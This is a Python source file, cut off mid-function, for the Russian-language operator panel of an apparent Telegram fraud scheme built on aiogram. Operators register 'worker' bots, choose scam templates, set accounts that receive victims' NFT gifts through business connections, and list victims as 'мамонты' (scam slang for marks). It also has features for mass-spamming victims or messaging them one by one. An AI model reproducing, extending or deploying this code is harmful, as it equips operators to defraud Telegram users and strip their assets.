import asyncio

from aiogram import Bot, Bot as BotClient, F, Router, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CopyTextButton
from sqlalchemy import update
import re

from sqlalchemy import and_, delete, func, or_, select
from sqlalchemy.orm import selectinload

from bot_notify import notify_admins_bot_added
from config import WEBHOOK_HOST
from db import Session
from models import Admin, BusinessConnection, CustomGift, Template, WorkerBot, WorkerBotUser
from config import OWNER_ACCOUNT_ID, PANEL_OWNERS

router = Router()

MAMONTY_PER_PAGE = 10  

class AddBot(StatesGroup):
    waiting_token = State()
    waiting_template = State()
    waiting_nft_target = State()

class SpamBot(StatesGroup):
    waiting_text = State()

class InlinePreviewState(StatesGroup):
    waiting_nft = State()
    waiting_button_text = State()
    waiting_message_text = State()

class MamontyStates(StatesGroup):
    waiting_user_id = State()
    waiting_message = State()
    waiting_block_user_id = State()
    waiting_unblock_user_id = State()

class MamontySearchState(StatesGroup):
    waiting_query = State()
    waiting_message = State()

@router.message(F.text == "🤖 Боты")
async def show_bots_menu_message(message: types.Message, state: FSMContext):
    if message.chat.type != "private":
        await message.answer("⛔ Доступно только в личке с ботом.")
        return

    await show_bots_menu_common(message, message.from_user.id, state)

@router.callback_query(F.data.startswith("show_bots_menu_"))
async def paginate_bots(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_bots_menu_common(callback, callback.from_user.id, state, page=0)

async def show_bots_menu_common(target, tg_id: int, state: FSMContext, page: int = 0):
    await state.clear()
    MAX_BOTS_PER_ADMIN = 15

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            text = "Профиль не найден"
            if isinstance(target, types.CallbackQuery):
                await target.message.edit_text(text)
                await target.answer()
            else:
                await target.answer(text)
            return

        bots = (
            await session.execute(
                select(WorkerBot)
                .where(WorkerBot.owner_id == admin.id)
                .options(selectinload(WorkerBot.template))
                .limit(MAX_BOTS_PER_ADMIN)
            )
        ).scalars().all()

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()
        total_mamonty = 0
        if bots_ids:
            total_mamonty = (await session.execute(
                select(func.count(func.distinct(WorkerBotUser.telegram_id)))
                .where(WorkerBotUser.worker_bot_id.in_(bots_ids))
            )).scalar() or 0

        total_users = (await session.execute(
            select(func.count(WorkerBotUser.id))
            .join(WorkerBot, WorkerBot.id == WorkerBotUser.worker_bot_id)
            .where(WorkerBot.owner_id == admin.id)
        )).scalar() or 0

        total_all_connections = (await session.execute(
            select(func.count(BusinessConnection.id))
            .where(BusinessConnection.admin_id == admin.id)
        )).scalar() or 0

        total_active_connections = (await session.execute(
            select(func.count(BusinessConnection.id))
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        )).scalar() or 0

        result = await session.execute(
            select(
                func.sum(WorkerBot.launches),
                func.sum(WorkerBot.premium_launches),
                func.count(WorkerBot.id)
            ).where(WorkerBot.owner_id == admin.id)
        )
        total_launches, total_premium_launches, total_bots = result.one()
        total_launches = total_launches or 0
        total_premium_launches = total_premium_launches or 0
        total_bots = total_bots or 0

    bot_buttons = []
    row = []
    for bot in bots:
        text = f"@{bot.username}" if bot.username else bot.name
        row.append(InlineKeyboardButton(text=text, callback_data=f"bot_{bot.id}"))
        if len(row) == 3:
            bot_buttons.append(row)
            row = []
    if row:
        bot_buttons.append(row)

    add_bot_text = f"Добавить бота ({total_bots}/{MAX_BOTS_PER_ADMIN})"
    add_bot_btn = [InlineKeyboardButton(text=add_bot_text, callback_data="add_bot")]
    mamonty_btn = [InlineKeyboardButton(text=f"Мамонты ({total_mamonty})", callback_data="show_mamonty")]

    kb_buttons = [add_bot_btn, mamonty_btn] + bot_buttons
    kb = InlineKeyboardMarkup(inline_keyboard=kb_buttons)

    text = (
        f"<b>🤖 Боты</b>\n\n"
        f"<i>📌 Создай личного бота через <b>@BotFather</b> и добавь его.</i>\n\n"
        f"<b>🎈 Общая статистика:</b>\n"
        f"<blockquote>"
        f"<b>🙆🏻‍♀️ Мамонты: {total_users}</b>\n"
        f"<b>💎 Премиум: {total_premium_launches}</b>\n"
        f"<b>🎯 Подключений: {total_all_connections}</b>\n"
        f"<b>🟢 Активные: {total_active_connections}</b>\n"
        f"</blockquote>"
    )

    if isinstance(target, types.CallbackQuery):
        await target.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
        await target.answer()
    else:
        await target.answer(text, reply_markup=kb, parse_mode="HTML")

@router.callback_query(F.data == "add_bot")
async def cb_add_bot(callback: types.CallbackQuery, state: FSMContext):
    MAX_BOTS_PER_ADMIN = 15
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = (
            select(Admin)
            .options(selectinload(Admin.settings))
            .where(Admin.telegram_id == tg_id)
        )
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        bot_count = 0
        if admin:
            res = await session.execute(
                select(func.count(WorkerBot.id)).where(WorkerBot.owner_id == admin.id)
            )
            bot_count = res.scalar() or 0

        if bot_count >= MAX_BOTS_PER_ADMIN:
            await callback.answer(
                f"❌ Лимит: {MAX_BOTS_PER_ADMIN} ботов. Больше добавить нельзя.",
                show_alert=True
            )
            return

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.answer(
                "⚠️ Перед добавлением бота необходимо подключить передачу в настройках.",
                show_alert=True
            )
            return

    await state.set_state(AddBot.waiting_token)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ])

    await callback.message.edit_text(
        "<b>🔑 Отправь токен бота:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(AddBot.waiting_token)
async def save_token(message: types.Message, state: FSMContext):
    token = message.text.strip()
    tg_id = message.from_user.id

    new_bot = BotClient(token=token)
    try:
        me = await new_bot.get_me()

        webhook_url = f"{WEBHOOK_HOST}/worker_webhook/{token}"
        await new_bot.set_webhook(url=webhook_url)  # Без secret_token

        async with Session() as session:
            result = await session.execute(select(Admin).where(Admin.telegram_id == tg_id))
            admin = result.scalar_one_or_none()

            if not admin:
                admin = Admin(
                    telegram_id=tg_id,
                    username=message.from_user.username
                )
                session.add(admin)
                await session.commit()

            new_worker_bot = WorkerBot(
                token=token,
                name=me.full_name,
                telegram_id=me.id,
                username=me.username,
                owner_id=admin.id
            )
            session.add(new_worker_bot)
            await session.commit()

            await notify_admins_bot_added(new_worker_bot)

            await state.update_data(worker_bot_id=new_worker_bot.id)
            await state.set_state(AddBot.waiting_template)

            # ✅ Исправленный запрос шаблонов
            result = await session.execute(
                select(Template)
                .where(
                    or_(
                        Template.owner_id == admin.id,
                        and_(Template.is_default == True, Template.owner_id.is_(None))
                    )
                )
                .order_by(Template.is_default.desc(), Template.name)
            )
            templates = result.scalars().all()

            if not templates:
                await message.answer("⚠️ У вас нет доступных шаблонов. Сначала создайте шаблон.")
                await state.clear()
                return

            kb = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(
                        text=f"{'🌐 ' if t.is_default else ''}{t.name}",
                        callback_data=f"choose_tpl_{t.id}"
                    )]
                    for t in templates
                ]
            )

            await message.answer(
                "<b>📎 Выберите шаблон, который будет использовать бот:</b>",
                reply_markup=kb,
                parse_mode="HTML"
            )

    except Exception as e:
        await message.answer(f"❌ Ошибка: <code>{e}</code>", parse_mode="HTML")

    finally:
        await new_bot.session.close()


@router.callback_query(F.data.startswith("choose_tpl_"))
async def assign_template_and_choose_target(callback: types.CallbackQuery, state: FSMContext):
    template_id = int(callback.data.split("_")[-1])
    data = await state.get_data()
    bot_id = data.get("worker_bot_id")
    tg_id = callback.from_user.id

    async with Session() as session:
        bot = await session.get(WorkerBot, bot_id)
        if bot:
            bot.template_id = template_id
            await session.commit()

        stmt = select(Admin).options(selectinload(Admin.settings)).where(Admin.telegram_id == tg_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.message.edit_text(
                "⚠️ У вас не настроены аккаунты для передачи. Добавьте их в настройках.",
                parse_mode="HTML"
            )
            await state.clear()
            return

        payout_ids = admin.settings.payout_ids.split(",")

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"ID: {pid.strip()}", callback_data=f"set_nft_target_{pid.strip()}")]
            for pid in payout_ids if pid.strip()
        ]
    )

    await callback.message.edit_text(
        "<b>📦 Выберите аккаунт, куда будет передаваться NFT:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )

    await state.set_state(AddBot.waiting_nft_target)
    await callback.answer()

@router.callback_query(F.data.startswith("set_nft_target_"))
async def set_nft_target(callback: types.CallbackQuery, state: FSMContext):
    target_id = int(callback.data.split("_")[-1])
    data = await state.get_data()
    bot_id = data.get("worker_bot_id")

    async with Session() as session:
        bot = await session.get(WorkerBot, bot_id)
        if bot:
            bot.nft_transfer_to_id = target_id
            await session.commit()

    await callback.answer("✅ Аккаунт привязан!", show_alert=True)

    await show_bots_menu_common(callback, callback.from_user.id, state)
    await state.clear()

async def show_bot_info_message(chat_id: int, bot_id: int):
    async with Session() as session:
        stmt = (
            select(WorkerBot)
            .where(
                WorkerBot.id == bot_id,
                WorkerBot.owner.has(telegram_id=chat_id)
            )
            .options(selectinload(WorkerBot.template), selectinload(WorkerBot.custom_template))
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            return

        active_conn_stmt = select(func.count()).where(
            BusinessConnection.worker_bot_id == bot.id,
            BusinessConnection.is_connected == True
        )
        active_connections = (await session.execute(active_conn_stmt)).scalar_one()

    template_info = (
        f"<b>📎 Шаблон:</b> <b>{bot.template.name}</b>"
        if bot.template else
        "<b>📎 Шаблон:</b> не установлен"
    )

    inlain_info = (
        f"<b>⚡️ Шаблон Inlain Mod:</b> <b>{bot.custom_template.template_name}</b>"
        if bot.custom_template else
        "<b>⚡️ Шаблон Inlain Mod:</b> не подключен"
    )

    nft_target_info = (
        f"<b>📤 Передача NFT идёт на ID:</b> <code>{bot.nft_transfer_to_id}</code>"
        if bot.nft_transfer_to_id else
        "<b>📤 Передача NFT не настроена</b>"
    )

    # --- Рефералка как текст ---
    ref_url = f"https://t.me/{bot.username}?start=ref_{bot.owner_id}"
    ref_text = f"<b>🔗 Реферальная ссылка:</b>\n<code>{ref_url}</code>"

    text = (
        f"<b>📍 Информация о боте</b>\n\n"
        f"🤖 <b>Бот:</b> <b>@{bot.username}</b>\n"
        f"🔑 <b>Token:</b> <code>{bot.token}</code>\n\n"
        f"<blockquote>"
        f"🚀 <b>Запуски:</b> <code>{bot.launches}</code>\n"
        f"💎 <b>Премиум-запуски:</b> <code>{bot.premium_launches}</code>\n"
        f"🎯 <b>Подключения:</b> <code>{bot.connection_count}</code>\n"
        f"🟢 <b>Активные подключения:</b> <code>{active_connections}</code>"
        f"</blockquote>\n\n"
        f"{template_info}\n"
        f"{inlain_info}\n"
        f"{nft_target_info}\n\n"
        f"{ref_text}"
    )

    keyboard = [
        [InlineKeyboardButton(text="Обновить", callback_data=f"bot_refresh_{bot.id}")],
        [InlineKeyboardButton(text="Подключить Inline", callback_data=f"connect_inline_{bot.id}")],
        [
            InlineKeyboardButton(text="Изменить шаблон", callback_data=f"bot_change_template_{bot.id}"),
            InlineKeyboardButton(text="Изменить передачу", callback_data=f"bot_change_transfer_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Проспамить", callback_data=f"bot_spam_{bot.id}"),
            InlineKeyboardButton(text="Удалить бота", callback_data=f"bot_confirm_delete_{bot.id}")
        ],
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=keyboard)

    from loader import bot as tg_bot
    await tg_bot.send_message(chat_id=chat_id, text=text, reply_markup=kb, parse_mode="HTML")

# =========================== Показ информации о боте ===========================
@router.callback_query(
    F.data.startswith("bot_")
    & ~F.data.startswith("bot_confirm_delete_")
    & ~F.data.startswith("bot_delete_")
    & ~F.data.startswith("bot_spam_")
    & ~F.data.startswith("bot_change_template_")
    & ~F.data.startswith("bot_change_transfer_")
    & ~F.data.startswith("connect_inline_")
)

async def show_bot_info(callback: types.CallbackQuery):
    data = callback.data
    is_refresh = data.startswith("bot_refresh_")
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        ).options(selectinload(WorkerBot.template), selectinload(WorkerBot.custom_template))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("Бот не найден", show_alert=True)
            return

        active_conn_stmt = select(func.count()).where(
            BusinessConnection.worker_bot_id == bot.id,
            BusinessConnection.is_connected == True
        )
        active_connections = (await session.execute(active_conn_stmt)).scalar_one()

    template_info = (
        f"<b>📎 Шаблон:</b> <b>{bot.template.name}</b>"
        if bot.template else
        "<b>📎 Шаблон:</b> не установлен"
    )
    inlain_info = (
        f"<b>⚡️ Шаблон Inlain Mod:</b> <b>{bot.custom_template.template_name}</b>"
        if bot.custom_template else
        "<b>⚡️ Шаблон Inlain Mod:</b> не подключен"
    )
    nft_target_info = (
        f"<b>📤 Передача NFT идёт на ID:</b> <code>{bot.nft_transfer_to_id}</code>"
        if bot.nft_transfer_to_id else
        "<b>📤 Передача NFT не настроена</b>"
    )

    ref_url = f"https://t.me/{bot.username}?start=ref_{bot.owner_id}"
    ref_text = f"<b>🔗 Реферальная ссылка:</b>\n<code>{ref_url}</code>"

    text = (
        f"<b>📍 Информация о боте</b>\n\n"
        f"🤖 <b>Бот:</b> <b>@{bot.username}</b>\n"
        f"🔑 <b>Token:</b> <code>{bot.token}</code>\n\n"
        f"<blockquote>"
        f"🚀 <b>Запуски:</b> <code>{bot.launches}</code>\n"
        f"💎 <b>Премиум-запуски:</b> <code>{bot.premium_launches}</code>\n"
        f"🎯 <b>Подключения:</b> <code>{bot.connection_count}</code>\n"
        f"🟢 <b>Активные подключения:</b> <code>{active_connections}</code>"
        f"</blockquote>\n\n"
        f"{template_info}\n"
        f"{inlain_info}\n"
        f"{nft_target_info}\n\n"
        f"{ref_text}"
    )

    keyboard = [
        [InlineKeyboardButton(text="Обновить", callback_data=f"bot_refresh_{bot.id}")],
        [InlineKeyboardButton(text="Подключить Inline", callback_data=f"connect_inline_{bot.id}")],
        [
            InlineKeyboardButton(text="Изменить шаблон", callback_data=f"bot_change_template_{bot.id}"),
            InlineKeyboardButton(text="Изменить передачу", callback_data=f"bot_change_transfer_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Проспамить", callback_data=f"bot_spam_{bot.id}"),
            InlineKeyboardButton(text="Удалить бота", callback_data=f"bot_confirm_delete_{bot.id}")
        ],
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=keyboard)

    try:
        if is_refresh:
            await callback.message.delete()
            await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
        else:
            await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest:
        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")

    await callback.answer()


@router.callback_query(F.data.startswith("connect_inline_"))
async def connect_inline_handler(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("❌ Профиль не найден", show_alert=True)
            return

        result = await session.execute(
            select(CustomGift).where(CustomGift.admin_id == admin.id)
        )
        custom_gifts = result.scalars().all()

    buttons = [
        [InlineKeyboardButton(text=gift.template_name, callback_data=f"set_inline_tpl_{gift.id}")]
        for gift in custom_gifts
    ]
    buttons.append([InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")])

    kb = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.edit_text(
        "<b>🔗 Выберите инлайн-шаблон для подключения:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("set_inline_tpl_"))
async def set_inline_template(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    gift_id = int(parts[-1])
    bot_id = int(callback.message.reply_markup.inline_keyboard[-1][0].callback_data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("❌ Профиль не найден", show_alert=True)
            return

        custom_gift = await session.get(CustomGift, gift_id)
        if not custom_gift or custom_gift.admin_id != admin.id:
            await callback.answer("❌ Шаблон не найден", show_alert=True)
            return

        bot = await session.get(WorkerBot, bot_id)
        if not bot or bot.owner_id != admin.id:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.custom_template_id = custom_gift.id
        await session.commit()

    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)
    await callback.answer("✅ Инлайн-шаблон подключён!")

@router.callback_query(F.data.startswith("bot_change_template_"))
async def change_bot_template(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt_admin = select(Admin).where(Admin.telegram_id == tg_id)
        result = await session.execute(stmt_admin)
        admin = result.scalar_one_or_none()

        if not admin:
            await callback.answer("❌ Ошибка: вы не зарегистрированы.", show_alert=True)
            return

        # ✅ Получаем дефолтные шаблоны и личные
        stmt_templates = select(Template).where(
            or_(
                Template.owner_id == admin.id,
                and_(Template.is_default == True, Template.owner_id.is_(None))
            )
        ).order_by(Template.is_default.desc(), Template.name)
        result = await session.execute(stmt_templates)
        templates = result.scalars().all()

        if not templates:
            await callback.answer("⚠️ У вас нет доступных шаблонов", show_alert=True)
            return

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text=f"{'🌐 ' if t.is_default else ''}{t.name}",
                callback_data=f"reassign_tpl_{bot_id}_{t.id}"
            )] for t in templates
        ] + [[InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")]]
    )

    await callback.message.edit_text(
        "<b>📎 Выберите новый шаблон для бота:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()


@router.callback_query(F.data.startswith("reassign_tpl_"))
async def reassign_template(callback: types.CallbackQuery, state: FSMContext):
    try:
        _, _, bot_id_str, template_id_str = callback.data.split("_")
        bot_id = int(bot_id_str)
        template_id = int(template_id_str)
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Неверный формат данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.template_id = template_id
        await session.commit()

    await callback.answer("✅ Шаблон успешно изменён.", show_alert=True)
    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)

# =========================== Подтверждение удаления ===========================
@router.callback_query(F.data.startswith("bot_confirm_delete_"))
async def confirm_delete_bot(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("Бот не найден", show_alert=True)
            return

    text = (
        f"<b>⚠️ Вы точно хотите удалить бота @{bot.username}?\n"
        f"Действие необратимо.</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Да", callback_data=f"bot_delete_{bot.id}"),
            InlineKeyboardButton(text="Нет", callback_data=f"bot_{bot.id}")
        ]
    ])

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()


# =========================== Удаление бота ===========================
@router.callback_query(F.data.startswith("bot_delete_"))
async def delete_bot(callback: types.CallbackQuery, state: FSMContext):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot_data = result.scalar_one_or_none()

        if not bot_data:
            await callback.answer("Бот не найден", show_alert=True)
            return

        try:
            worker_bot = Bot(token=bot_data.token, default=DefaultBotProperties(parse_mode="HTML"))
            await worker_bot.delete_webhook(drop_pending_updates=True)
            await worker_bot.session.close()
        except Exception as e:
            print(f"[DELETE_WEBHOOK_ERROR] {e}")

        try:
            await session.execute(
                delete(BusinessConnection).where(BusinessConnection.worker_bot_id == bot_data.id)
            )
            await session.execute(
                delete(WorkerBotUser).where(WorkerBotUser.worker_bot_id == bot_data.id)
            )
            await session.delete(bot_data)
            await session.commit()
        except Exception as e:
            print(f"[DB_DELETE_ERROR] {e}")

    await callback.answer("✅ Бот успешно удалён.", show_alert=True)
    await show_bots_menu_common(callback, tg_id, state)

@router.callback_query(F.data.startswith("back_from_spam_"))
async def back_from_spam_to_bot(callback: types.CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if current_state == SpamBot.waiting_text.state:
        await state.clear()

    bot_id = int(callback.data.split("_")[-1])

    try:
        await callback.message.delete()
    except Exception:
        pass

    await show_bot_info_message(callback.from_user.id, bot_id)

    await callback.answer()

@router.callback_query(F.data.startswith("bot_spam_"))
async def start_spam_prompt(callback: types.CallbackQuery, state: FSMContext):
    bot_id = int(callback.data.split("_")[-1])

    await state.set_state(SpamBot.waiting_text)
    await state.update_data(bot_id=bot_id)

    current_state = await state.get_state()

    text = (
        "<b>✉️ Введите текст рассылки для пользователей бота</b>\n\n"
        "<b>Вы можете использовать любое форматирование текста.</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data=f"back_from_spam_{bot_id}")]
    ])

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@router.message(SpamBot.waiting_text)
async def handle_spam_text(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    print(f"[DEBUG] Handling spam text in state: {current_state}")

    if message.content_type != "text":
        await message.answer(
            "<b>❌ Ошибка:</b> Только текст разрешён для рассылки.\n"
            "Пожалуйста, отправьте обычное сообщение с текстом.",
            parse_mode="HTML"
        )
        return

    data = await state.get_data()
    bot_id = data.get("bot_id")
    spam_text = message.html_text

    await state.clear()

    current_state_after_clear = await state.get_state()
    print(f"[DEBUG] State after clear: {current_state_after_clear}")

    await message.answer("<b>✅ Рассылка запустилась, ожидайте статистику.</b>", parse_mode="HTML")

    asyncio.create_task(run_spam_in_background(bot_id, spam_text))

async def run_spam_in_background(bot_id: int, spam_text: str):
    from loader import bot as main_bot

    async with Session() as session:
        stmt = select(WorkerBot).where(WorkerBot.id == bot_id).options(selectinload(WorkerBot.owner))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            return

        stmt_users = select(WorkerBotUser.telegram_id).where(
            WorkerBotUser.worker_bot_id == bot.id
        )
        result = await session.execute(stmt_users)
        user_ids = [row[0] for row in result.fetchall()]
        total = len(user_ids)

    success = 0
    failed = 0

    bot_client = Bot(token=bot.token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

    for user_id in user_ids:
        try:
            await bot_client.send_message(chat_id=user_id, text=spam_text)
            success += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)

    owner_id = bot.owner.telegram_id
    result_text = (
        f"<b>📊 Статистика рассылки</b>\n\n"
        f"<b>👥 Всего пользователей: {total}</b>\n"
        f"<b>✅ Успешно отправлено: {success}</b>\n"
        f"<b>❌ Не доставлено: {failed}</b>"
    )

    try:
        await main_bot.send_message(chat_id=owner_id, text=result_text)
    except Exception:
        pass

@router.callback_query(F.data.startswith("bot_change_transfer_"))
async def change_nft_transfer(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        # Получаем админа и его настройки
        stmt_admin = select(Admin).options(selectinload(Admin.settings)).where(Admin.telegram_id == tg_id)
        result = await session.execute(stmt_admin)
        admin = result.scalar_one_or_none()

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.answer("❌ Нет доступных аккаунтов для передачи.\nДобавьте их в настройках.", show_alert=True)
            return

        payout_ids = [pid.strip() for pid in admin.settings.payout_ids.split(",") if pid.strip()]

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"ID: {pid}", callback_data=f"reassign_transfer_{bot_id}_{pid}")]
            for pid in payout_ids
        ] + [[InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")]]
    )

    await callback.message.edit_text(
        "<b>📦 Выберите новый аккаунт для передачи NFT:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("reassign_transfer_"))
async def reassign_nft_transfer(callback: types.CallbackQuery):
    try:
        _, _, bot_id_str, nft_id_str = callback.data.split("_")
        bot_id = int(bot_id_str)
        nft_id = int(nft_id_str)
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Неверный формат данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.nft_transfer_to_id = nft_id
        await session.commit()

    await callback.answer("✅ Передача успешно изменена.", show_alert=True)
    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)

############################################## Мамонты ##############################################

@router.callback_query(F.data.startswith("show_mamonty"))
async def show_mamonty_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  
    await show_mamonty_menu_core(callback)


async def show_mamonty_menu_core(callback: types.CallbackQuery): 
    tg_id = callback.from_user.id
    parts = callback.data.split(":")
    page = int(parts[1]) if len(parts) > 1 else 1

    # Добавляем айди в set для быстрого поиска
    exclude_ids = set(PANEL_OWNERS + [OWNER_ACCOUNT_ID])

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("Профиль не найден", show_alert=True)
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        users = []
        bot_map = {}
        if bots_ids:
            users = (await session.execute(
                select(WorkerBotUser)
                .where(WorkerBotUser.worker_bot_id.in_(bots_ids))
                .distinct(WorkerBotUser.telegram_id)
            )).scalars().all()
            users = [u for u in users if u.telegram_id not in exclude_ids]
            if not users:
                await callback.answer("❗️У вас нет мамонтов.", show_alert=True)
                return

            bot_usernames = (await session.execute(
                select(WorkerBot.id, WorkerBot.username)
                .where(WorkerBot.id.in_([user.worker_bot_id for user in users]))
            )).all()
            bot_map = {bot_id: username for bot_id, username in bot_usernames}

    total = len(users)
    pages = (total + MAMONTY_PER_PAGE - 1) // MAMONTY_PER_PAGE
    page = max(1, min(page, pages)) if pages else 1
    start = (page - 1) * MAMONTY_PER_PAGE
    end = start + MAMONTY_PER_PAGE
    page_users = users[start:end]

    mamonty_text = "\n".join(
        f"{i + 1 + start}. <b>@{user.username or '-'}</b> | <b>ID</b> <code>{user.telegram_id}</code> | <b>Бот: @{bot_map.get(user.worker_bot_id, '-')}</b>"
        for i, user in enumerate(page_users)
    )
    text = f"<b>🙆🏻‍♀️ Мамонты ({total}):</b>\n\n{mamonty_text}"

    nav = [
        InlineKeyboardButton(text="<", callback_data=f"show_mamonty:{page - 1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{pages}" if pages else "1/1", callback_data="ignore"),
        InlineKeyboardButton(text=">", callback_data=f"show_mamonty:{page + 1}" if page < pages else "ignore")
    ]

    keyboard = []
    keyboard.append(nav)
    keyboard.append([
        InlineKeyboardButton(text="Поиск мамонта", callback_data="mamonty_search"),
        InlineKeyboardButton(text="Написать мамонту", callback_data="messeng_spam")
    ])
    keyboard.append([
        InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")
    ])

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)

    await callback.message.edit_text(
        text,
        reply_markup=markup,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data == "ignore")
async def ignore_callback(callback: types.CallbackQuery):
    await callback.answer()

# Назад (чистим состояние и редактируем меню)
@router.callback_query(F.data == "back_to_mamonty")
async def mamonty_back_handler(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_mamonty_menu_core(callback)
    await callback.answer()

@router.callback_query(F.data == "messeng_spam")
async def mamonty_spam_prompt(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(MamontyStates.waiting_user_id)
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>✉️ Введите ID мамонта, которому хотите написать:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontyStates.waiting_user_id)
async def get_user_id(message: types.Message, state: FSMContext):
    user_id = message.text.strip()
    if not user_id.isdigit():
